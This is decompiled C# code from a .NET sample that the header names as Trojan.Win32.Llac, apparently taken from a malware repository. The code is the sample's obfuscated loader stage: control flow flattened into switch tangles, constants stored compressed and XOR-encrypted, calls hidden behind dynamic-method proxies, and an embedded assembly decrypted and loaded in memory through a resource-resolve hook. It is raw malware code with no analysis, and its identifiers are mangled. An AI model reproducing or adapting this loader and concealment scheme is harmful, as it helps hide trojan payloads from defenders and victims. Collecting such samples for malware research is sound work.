// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Mains, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 87A24014-4235-4CFD-B5E9-8BC1446D37FE
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Llac.cngn-840708e58ff5f353e7ccf1a3e18dd92ffbd88eddd34568dc7ad3dc323ccd1679.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

internal class \u003CModule\u003E
{
  static Dictionary<uint, object> 묻㕒똩磠삩鲮\uF8C3꽯;
  static MemoryStream 敢閤\uE070㫽俩뺇㷾뫐;
  static Assembly 趷薣\u335C㼭瀄㢂\uEFAC쏴;

  static \u003CModule\u003E()
  {
    똄ᐥ\uF1DE\uA4FF䵉펀ᆛ砪.\u2383륫䨚俼쟑긓䟗牍();
    switch (-9 - ~11)
    {
      default:
        AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.\uFFFDc\uFFFD\uFFFDO\u00236\u0040\uFFFD\u002B\uFFFDEZ\uFFFD\uFFFD\uFFFD);
        break;
    }
  }

  internal static object \uFFFD\u003A\uFFFDգ\uFFFD\uFFFD0\u007F\uFFFDΠf\uFFFD\uFFFD\uFFFD(uint id)
  {
    int num1 = ~-~-2;
    bool flag;
    while (true)
    {
      switch (num1)
      {
        case 1:
          if (!flag)
          {
            \u003CModule\u003E.묻㕒똩磠삩鲮\uF8C3꽯 = new Dictionary<uint, object>();
            num1 = 4 - -~1;
            continue;
          }
          goto label_63;
        case 2:
          goto label_5;
        default:
          flag = \u003CModule\u003E.묻㕒똩磠삩鲮\uF8C3꽯 != null;
          num1 = ~(~-6 - 7);
          continue;
      }
    }
label_5:
    \u003CModule\u003E.敢閤\uE070㫽俩뺇㷾뫐 = new MemoryStream();
    DeflateStream deflateStream = new DeflateStream(Assembly.GetCallingAssembly().GetManifestResourceStream("$8��?��AY8`�y���"), CompressionMode.Decompress);
    try
    {
      int num2 = -(-(4 - 9) - 10) - 3;
      byte[] buffer;
      int count;
      while (true)
      {
        switch (num2)
        {
          case 1:
            flag = count != 0;
            num2 = --3 - -2;
            continue;
          case 2:
            buffer = new byte[4096];
            count = deflateStream.Read(buffer, 0, 4096);
            num2 = ~~--7;
            continue;
          case 3:
            goto label_19;
          case 4:
            num2 = ~(-~7 - 13) + 2;
            continue;
          case 5:
            if (!flag)
            {
              num2 = -(~-2 - 5 - (3 - 4));
              continue;
            }
            goto case 7;
          case 6:
            count = deflateStream.Read(buffer, 0, 4096);
            num2 = ~4 - (7 - 22) - 9;
            continue;
          case 7:
            num2 = ~3 - ~8 - 5;
            continue;
          default:
            \u003CModule\u003E.敢閤\uE070㫽俩뺇㷾뫐.Write(buffer, 0, count);
            num2 = ----4;
            continue;
        }
      }
    }
    finally
    {
      flag = deflateStream == null;
      if (!flag)
        deflateStream.Dispose();
    }
label_19:
    int num3 = ~(-(7 + 6) - 21 + 3);
label_20:
    uint num4;
    while (true)
    {
      int num5;
      do
      {
        BinaryReader binaryReader;
        uint num6;
        int index;
        byte num7;
        byte[] bytes;
        object obj;
        uint num8;
        uint num9;
        uint num10;
        uint num11;
        int num12;
        do
        {
          int num13;
          do
          {
            ushort num14;
            ushort num15;
            ushort num16;
            uint num17;
            int num18;
            int num19;
            do
            {
              ushort num20;
              int num21;
              do
              {
                int num22;
                do
                {
                  switch (num3)
                  {
                    case 1:
                      binaryReader.BaseStream.Seek((long) num6, SeekOrigin.Begin);
                      num3 = -(-29 - -~6) + 3;
                      continue;
                    case 2:
                      num22 = flag ? 1 : 0;
                      num3 = -~21 + 4;
                      continue;
                    case 3:
                      goto label_25;
                    case 4:
                      goto label_26;
                    case 5:
                      goto label_27;
                    case 6:
                      goto label_29;
                    case 7:
                      goto label_31;
                    case 8:
                      goto label_32;
                    case 9:
                    case 13:
                    case 20:
                      goto label_40;
                    case 10:
                      goto label_35;
                    case 11:
                      goto label_36;
                    case 12:
                      goto label_38;
                    case 14:
                      goto label_41;
                    case 15:
                      goto label_43;
                    case 16:
                      goto label_44;
                    case 17:
                      goto label_46;
                    case 18:
                      goto label_47;
                    case 19:
                      goto label_48;
                    case 21:
                      goto label_52;
                    case 22:
                      goto label_53;
                    case 23:
                      goto label_54;
                    case 24:
                      goto label_55;
                    case 25:
                      goto label_56;
                    case 26:
                      goto label_58;
                    case 27:
                      goto label_59;
                    case 28:
                      goto label_60;
                    case 29:
                      goto label_61;
                    case 30:
                      goto label_63;
                    case 31:
                      goto label_64;
                    case 32:
                      goto label_65;
                    case 33:
                      goto label_67;
                    case 34:
                      goto label_68;
                    case 35:
                      goto label_70;
                    case 36:
                      goto label_71;
                    case 37:
                      goto label_74;
                    case 38:
                      goto label_75;
                    case 39:
                      goto label_76;
                    case 40:
                      goto label_77;
                    case 41:
                      goto label_79;
                    case 42:
                      goto label_90;
                    case 43:
                      goto label_81;
                    case 44:
                      goto label_82;
                    case 45:
                      goto label_83;
                    case 46:
                      goto label_84;
                    case 47:
                      goto label_85;
                    case 48:
                      goto label_86;
                    case 49:
                      goto label_87;
                    case 50:
                      goto label_88;
                    case 51:
                      goto label_89;
                    case 52:
                      goto label_91;
                    case 53:
                      goto label_92;
                    default:
                      num3 = -~16 - 2;
                      continue;
                  }
                }
                while (num22 != 0);
                num3 = 42 - ~~8;
                continue;
label_25:
                num14 = num20;
                num16 = num15;
                index = 0;
                num3 = 22 - (2 + -4);
                continue;
label_26:
                num16 = (ushort) ((num17 * (uint) num16 + (uint) num20) % 65536U);
                num3 = ~---44;
                continue;
label_27:
                flag = num7 != (byte) 209;
                if (!flag)
                {
                  obj = (object) BitConverter.ToInt32(bytes, 0);
                  num3 = -(~38 - (9 - 6));
                  continue;
                }
                goto label_80;
label_29:
                if (!flag)
                {
                  num3 = ~4 - (6 - 7) - -27 - 6 + 4;
                  continue;
                }
                if (num11 >= 16U)
                {
                  num18 = num11 >= 32U ? 1 : 0;
                  goto label_62;
                }
                else
                  goto label_61;
label_31:
                bytes = binaryReader.ReadBytes(binaryReader.ReadInt32());
                num17 = 1862636393U ^ num6;
                num3 = 51 + -(3 + 9) - 8;
                continue;
label_32:
                num8 ^= (uint) (((int) num4 & 16711935) << 8 ^ ((int) ((num4 & 16776960U) >> 8) | ~(int) num4 & (int) ushort.MaxValue));
                num9 += num4 * num10 % 32U;
                num4 |= (uint) ((int) num8 + ~(int) num9 & 1862636393);
                num3 = 5 + 9 + (3 - 4) - 18 + (9 + 9);
                continue;
label_35:
                num10 = 1U;
                num3 = -(-38 - (3 - 6 + ~5) - (6 - 3));
                continue;
label_36:
                num21 = (int) num11;
                num3 = 19 - 5 - 2 + 7;
              }
              while ((uint) num21 < 32U);
              num3 = -(~(3 + 7) - 21 - ~3);
              continue;
label_38:
              flag = \u003CModule\u003E.묻㕒똩磠삩鲮\uF8C3꽯.TryGetValue(num6, out obj);
              if (!flag)
              {
                binaryReader = new BinaryReader((Stream) \u003CModule\u003E.敢閤\uE070㫽俩뺇㷾뫐);
                num3 = 18 - (8 + (2 + 7));
                continue;
              }
              goto label_79;
label_40:
              num3 = ~-29 - 5;
              continue;
label_41:
              if (!flag)
              {
                obj = (object) BitConverter.ToInt64(bytes, 0);
                goto label_90;
              }
              else
                goto label_74;
label_43:
              num4 = (uint) (((int) num4 & 16777215) << 8) | (num4 & 4278190080U) >> 24;
              num3 = -(2 - 47 + -3);
              continue;
label_44:
              if (!flag)
              {
                num8 += (uint) (((int) num4 & (int) byte.MaxValue | (int) ((num4 & 16711680U) >> 16)) + (~(int) num4 & (int) byte.MaxValue));
                num9 -= (uint) ~((int) num4 + (int) num11) % 48U;
                num4 ^= num8 % num9 | 1862636393U;
                num3 = 54 - --8 - (6 - 2) - 7;
                continue;
              }
              int num23;
              if (num11 >= 48U)
              {
                num23 = num11 >= 64U ? 1 : 0;
                goto label_72;
              }
              else
                goto label_71;
label_46:
              num9 ^= (uint) ((int) num4 * (int) num10 + 1) % 16U;
              num3 = -~--32;
              continue;
label_47:
              num8 ^= (uint) (((int) ((num4 & 16711680U) >> 16) | ~((int) num4 & (int) byte.MaxValue)) * (~(int) num4 & 16711680));
              num3 = ~~44 + 2;
              continue;
label_48:
              int num24 = 1;
label_49:
              flag = num24 != 0;
              num3 = 5 - -(3 - (2 - 3 + ~6));
              continue;
label_52:
              num3 = -(-31 - (5 + 9));
              continue;
label_53:
              num20 = (ushort) (num17 & (uint) ushort.MaxValue);
              num3 = ~(-8 - -4);
              continue;
label_54:
              ++num10;
              num3 = -~~-32;
              continue;
label_55:
              flag = index < bytes.Length;
              num3 = 5 - ~(-7 - -(9 - 6));
              continue;
label_56:
              num19 = flag ? 1 : 0;
              num3 = --2 - (6 - 9);
              continue;
label_60:
              num24 = num11 >= 48U ? 1 : 0;
              goto label_49;
label_71:
              num23 = 1;
label_72:
              flag = num23 != 0;
              if (flag)
                goto label_40;
              else
                goto label_73;
            }
            while (num19 != 0);
            num3 = -~~-50;
            continue;
label_58:
            bytes[index] ^= (byte) ((num17 * (uint) num14 + (uint) num16) % 256U);
            num14 = (ushort) ((num17 * (uint) num14 + (uint) num15) % 65536U);
            num3 = -28 - ~(7 + 7) - ~9 + 7;
            continue;
label_59:
            flag = num7 != (byte) 64;
            num3 = -(-(3 - 9) - 24 + (2 - 9));
            continue;
label_61:
            num18 = 1;
label_62:
            flag = num18 != 0;
            num3 = ~(~4 - (56 - (-2 + (7 + 2))));
            continue;
label_64:
            num15 = (ushort) (num17 >> 16);
            num3 = --(17 - (-5 + (5 - 5)));
            continue;
label_65:
            flag = num10 <= 64U;
            num13 = flag ? 1 : 0;
            num3 = ~~~-1;
          }
          while (num13 != 0);
          num3 = ~-(2 + 5 - -38);
          continue;
label_67:
          num4 += (uint) (((int) num8 | (int) num9) ^ 1862636393);
          num3 = 2 - 4 - -5 + 6;
          continue;
label_68:
          flag = num7 != (byte) 141;
          num12 = flag ? 1 : 0;
          num3 = -~--26;
        }
        while (num12 != 0);
        num3 = ~~(31 + (8 + 5 - -5));
        continue;
label_70:
        num3 = -~24 - 5;
        continue;
label_73:
        num3 = --30 - (9 + 3);
        continue;
label_74:
        flag = num7 != (byte) 109;
        num3 = -~~-40;
        continue;
label_75:
        num9 = 1105545139U;
        num3 = ~-23 - (5 + 7);
        continue;
label_76:
        num7 = binaryReader.ReadByte();
        num3 = -(-13 - ~(5 - 7) + 7);
        continue;
label_77:
        if (!flag)
        {
          num3 = 6 - -45;
          continue;
        }
        goto label_90;
label_79:
        return obj;
label_80:
        flag = num7 != (byte) 156;
        num3 = -(-(6 + 8) - 8) - 8;
        continue;
label_81:
        ++index;
        num3 = ~-29 + (8 - 9) - 3;
        continue;
label_82:
        num6 = num4 ^ id;
        num3 = ~~~-13;
        continue;
label_83:
        num8 |= (uint) ((int) ((num4 & 65280U) >> 8) & (int) ((num4 & 16711680U) >> 16) ^ ~(int) num4 & (int) byte.MaxValue);
        num3 = ~~~-18;
        continue;
label_84:
        num9 += (num4 ^ num10 - 1U) % num11;
        num3 = 2 - -(34 + (5 - -6));
        continue;
label_85:
        num4 -= (uint) (~((int) num8 ^ (int) num9) + 1862636393);
        num3 = ~-(7 + --7);
        continue;
label_86:
        num11 = (num4 & (uint) byte.MaxValue) % 64U;
        flag = num11 < 0U || num11 >= 16U;
        num3 = 7 - ~-2;
        continue;
label_87:
        obj = (object) BitConverter.ToDouble(bytes, 0);
        goto label_90;
label_88:
        obj = (object) BitConverter.ToSingle(bytes, 0);
        goto label_90;
label_89:
        obj = (object) Encoding.UTF8.GetString(bytes);
label_90:
        \u003CModule\u003E.묻㕒똩磠삩鲮\uF8C3꽯[num6] = obj;
        num3 = -(--2 - 43 + (8 - 8));
        continue;
label_91:
        num8 = 816133404U;
        num3 = --43 - 5;
        continue;
label_92:
        num5 = flag ? 1 : 0;
        num3 = ~-(17 - 5);
      }
      while (num5 != 0);
      num3 = 25 - (9 - 4 + 7) + ~9 + 5;
    }
label_63:
    num4 = 353557994U ^ (uint) new StackFrame(1).GetMethod().MetadataToken;
    num3 = 60 - ~-6 - (8 - 5);
    goto label_20;
  }

  internal static void 錟氁\uE5C0\uEE6C\uF7B0䫮줰ꮖ(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    char[] chArray = new char[fieldFromHandle.Name.Length];
    int index = 0;
    int num1 = -(-18 - -(8 - 2) + (8 - 3));
    while (true)
    {
      ILGenerator ilGenerator;
      ConstructorInfo con;
      bool flag;
      DynamicMethod dynamicMethod;
      int num2;
      do
      {
        switch (num1)
        {
          case 1:
            ilGenerator.Emit(OpCodes.Newobj, con);
            ilGenerator.Emit(OpCodes.Ret);
            num1 = ~(~2 + -9);
            continue;
          case 2:
            flag = index < chArray.Length;
            num1 = ~~(5 + (9 + -8));
            continue;
          case 3:
            index = 0;
            num1 = 4 - --0;
            continue;
          case 4:
            goto label_19;
          case 5:
            fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
            num1 = ~(3 - ~-4 - (6 - 5));
            continue;
          case 6:
            num2 = flag ? 1 : 0;
            num1 = --9 - 3 + 7;
            continue;
          case 7:
            goto label_10;
          case 8:
            if (flag)
            {
              ilGenerator.Emit(OpCodes.Ldarg_S, index);
              num1 = ~-17 + (5 - 9) - 3;
              continue;
            }
            goto label_12;
          case 9:
            goto label_13;
          case 10:
            goto label_14;
          case 11:
            goto label_15;
          case 12:
            goto label_16;
          case 13:
            goto label_17;
          case 14:
            goto label_20;
          case 15:
            goto label_18;
          case 16:
            goto label_22;
          default:
            num1 = -(9 - 9) - -12 + 5 - 3;
            continue;
        }
      }
      while (num2 != 0);
      num1 = -(-6 + ~5);
      continue;
label_10:
      num1 = ~-8 + ~6 + 2;
      continue;
label_12:
      num1 = -0 - (2 - 3);
      continue;
label_13:
      num1 = -(~6 + ~7);
      continue;
label_14:
      index = 0;
      num1 = ~(~19 + (5 - 2));
      continue;
label_15:
      num1 = 4 - (--4 - 5);
      continue;
label_16:
      byte[] numArray = Convert.FromBase64String(new string(chArray));
      con = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 0) ^ 965611031 | (int) numArray[4] << 24) as ConstructorInfo;
      ParameterInfo[] parameters = con.GetParameters();
      Type[] parameterTypes = new Type[parameters.Length];
      num1 = 9 - ~(3 - -~2);
      continue;
label_17:
      chArray[index] = (char) ((uint) (byte) fieldFromHandle.Name[index] ^ (uint) index);
      ++index;
      num1 = ~(-5 - (~2 + 7) - -6);
      continue;
label_18:
      ++index;
label_19:
      flag = index < parameterTypes.Length;
      num1 = --3 + 5;
      continue;
label_22:
      while (true)
      {
        flag = index < parameters.Length;
        if (flag)
        {
          parameterTypes[index] = parameters[index].ParameterType;
          ++index;
        }
        else
          break;
      }
      dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
      ilGenerator = dynamicMethod.GetILGenerator();
      num1 = ~---4;
    }
label_20:;
  }

  internal static void Ⲡ蕚傜ቪ\uE1F1遂鏲\uFFFD(RuntimeFieldHandle f)
  {
    int num1 = ~(~~3 - 14) - 8;
    while (true)
    {
      int index;
      Type[] parameterTypes;
      ParameterInfo[] parameters;
      ILGenerator ilGenerator;
      int num2;
      do
      {
        FieldInfo fieldFromHandle;
        MethodInfo methodInfo;
        bool flag;
        int num3;
        do
        {
          switch (num1)
          {
            case 1:
              num1 = 5 - (8 - 9) - -16;
              continue;
            case 2:
              fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
              num1 = -(~-9 - 6 - (7 + 9));
              continue;
            case 3:
              index = 0;
              goto case 4;
            case 4:
              flag = index < parameters.Length;
              num1 = --~-6;
              continue;
            case 5:
              if (flag)
              {
                parameterTypes[index + 1] = parameters[index].ParameterType;
                ++index;
                num1 = -(-12 - ~(6 + 5) + ~3);
                continue;
              }
              flag = !methodInfo.DeclaringType.IsInterface;
              num3 = flag ? 1 : 0;
              num1 = -(~23 - ~5);
              continue;
            case 6:
              goto label_11;
            case 7:
              goto label_12;
            case 8:
              goto label_13;
            case 9:
              goto label_14;
            case 10:
              goto label_15;
            case 11:
              goto label_16;
            case 12:
              goto label_17;
            case 13:
              goto label_20;
            case 14:
              goto label_21;
            case 15:
              goto label_22;
            case 16:
              goto label_19;
            case 17:
              goto label_24;
            case 18:
              goto label_25;
            case 19:
              goto label_26;
            case 20:
              goto label_23;
            case 21:
              goto label_27;
            case 22:
              goto label_28;
            case 23:
              goto label_30;
            case 24:
              goto label_31;
            case 25:
              goto label_34;
            case 26:
              goto label_35;
            case 27:
              goto label_36;
            case 28:
              goto label_37;
            default:
              fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
              num1 = --13 - (3 - 7) + 6;
              continue;
          }
        }
        while (num3 != 0);
        num1 = ~~(19 - 2);
        continue;
label_11:
        DynamicMethod dynamicMethod;
        ilGenerator = dynamicMethod.GetILGenerator();
        index = 0;
        num1 = ~(-22 - -5);
        continue;
label_12:
        flag = !methodInfo.IsStatic;
        num1 = ~(2 - 19 + 6);
        continue;
label_13:
        parameters = methodInfo.GetParameters();
        num1 = 17 + (-5 + (6 + 7));
        continue;
label_14:
        fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
        num1 = ~~~-12;
        continue;
label_15:
        num1 = flag ? -(~~7 - 23) - 8 : --~-1;
        continue;
label_16:
        num1 = 30 + (~4 + 2);
        continue;
label_17:
        ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
label_18:
        ++index;
label_19:
        flag = index < parameterTypes.Length;
        num1 = flag ? 8 - -(27 - ~-8) : -3 + (2 + 7) - -8 - -7;
        continue;
label_20:
        parameterTypes[0] = typeof (object);
        num1 = 13 + (7 - 8 + -7) + -2;
        continue;
label_21:
        char[] chArray = new char[fieldFromHandle.Name.Length];
        num1 = ~-21 + (8 + 5) - 7;
        continue;
label_22:
        byte[] numArray = Convert.FromBase64String(new string(chArray));
        methodInfo = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 1) ^ 658851669 | ((int) numArray[0] & (int) sbyte.MaxValue) << 24) as MethodInfo;
        num1 = ~(~3 - 4);
        continue;
label_24:
        dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, (Type) null, true);
        num1 = -(5 + -5 - 13) - 7;
        continue;
label_25:
        dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
        num1 = -(6 - ~(5 - 5) - (4 + 9));
        continue;
label_26:
        ilGenerator.Emit(OpCodes.Ret);
        num1 = ~-(12 - ~(2 - 5));
        continue;
label_27:
        ilGenerator.Emit(((int) numArray[0] & 128) != 0 ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
        num1 = -~(37 - (5 + 5 - ~8));
        continue;
label_28:
        flag = index != 0;
        if (!flag)
        {
          num1 = ~(~16 - -4);
          continue;
        }
        goto label_18;
label_30:
        num1 = -(3 - 9) - -19 - (7 - 5) - 3;
        continue;
label_31:
        chArray[index] = (char) ((uint) (byte) fieldFromHandle.Name[index] ^ (uint) index);
        ++index;
label_32:
        flag = index < chArray.Length;
        num2 = flag ? 1 : 0;
        num1 = ~-38 - 4 - 9;
        continue;
label_35:
        index = 0;
        goto label_32;
      }
      while (num2 != 0);
      num1 = ~~~-16;
      continue;
label_34:
      parameterTypes = new Type[parameters.Length + 1];
      num1 = --6 + 7;
      continue;
label_37:
      ilGenerator.Emit(OpCodes.Ldarg, index);
      num1 = ~~~-2;
    }
label_23:
    return;
label_36:;
  }

  internal static Assembly \uFFFDc\uFFFD\uFFFDO\u00236\u0040\uFFFD\u002B\uFFFDEZ\uFFFD\uFFFD\uFFFD(
    object sender,
    ResolveEventArgs args)
  {
    bool flag = (object) \u003CModule\u003E.趷薣\u335C㼭瀄㢂\uEFAC쏴 != null;
    int num1 = ~6 - ~-2 + 8;
    while (true)
    {
      switch (num1)
      {
        case 1:
          num1 = ~(~9 + (2 + 5));
          continue;
        case 2:
          goto label_5;
        default:
          if (!flag)
          {
            num1 = --16 - (6 + 2) - 7;
            continue;
          }
          goto label_26;
      }
    }
label_5:
    BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("F\u0014��C\u0006~M�.�*�kp\a"), CompressionMode.Decompress));
    try
    {
      int num2 = --6 - 2;
      int index;
      byte[] numArray;
      byte num3;
      while (true)
      {
        switch (num2)
        {
          case 1:
            flag = index < numArray.Length;
            num2 = flag ? ~~--8 : 9 - 9 - (4 - 8) - 1;
            continue;
          case 2:
            ++index;
            goto case 1;
          case 3:
            \u003CModule\u003E.趷薣\u335C㼭瀄㢂\uEFAC쏴 = Assembly.Load(numArray);
            num2 = ~(~-1 - 6);
            continue;
          case 4:
            numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
            num3 = (byte) 154;
            num2 = --11 - 5;
            continue;
          case 5:
            Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
            num2 = ~(5 - 9 - (~~3 - 6));
            continue;
          case 6:
            index = 0;
            num2 = ~(6 + 6 - --14);
            continue;
          case 7:
            num2 = -(5 + 6 - --13);
            continue;
          case 8:
            numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num3);
            num3 = (byte) ((int) num3 * 154 % 256);
            num2 = ~---8;
            continue;
          default:
            goto label_19;
        }
      }
    }
    finally
    {
      flag = binaryReader == null;
      if (!flag)
        binaryReader.Dispose();
    }
label_19:
    int num4 = ~~(4 - ~(5 - 7));
label_20:
    Assembly assembly;
    while (true)
    {
      switch (num4)
      {
        case 1:
          goto label_23;
        case 2:
          goto label_24;
        case 3:
          num4 = -(8 + ~(3 + 4)) + 4;
          continue;
        case 4:
          goto label_26;
        default:
          if (!flag)
          {
            assembly = (Assembly) null;
            num4 = 10 + (9 - (9 + 8)) - 4 + 4;
            continue;
          }
          goto label_23;
      }
    }
label_23:
    assembly = \u003CModule\u003E.趷薣\u335C㼭瀄㢂\uEFAC쏴;
label_24:
    return assembly;
label_26:
    flag = Array.IndexOf<string>(\u003CModule\u003E.趷薣\u335C㼭瀄㢂\uEFAC쏴.GetManifestResourceNames(), args.Name) != -1;
    num4 = ~(--6 + ~6);
    goto label_20;
  }
}
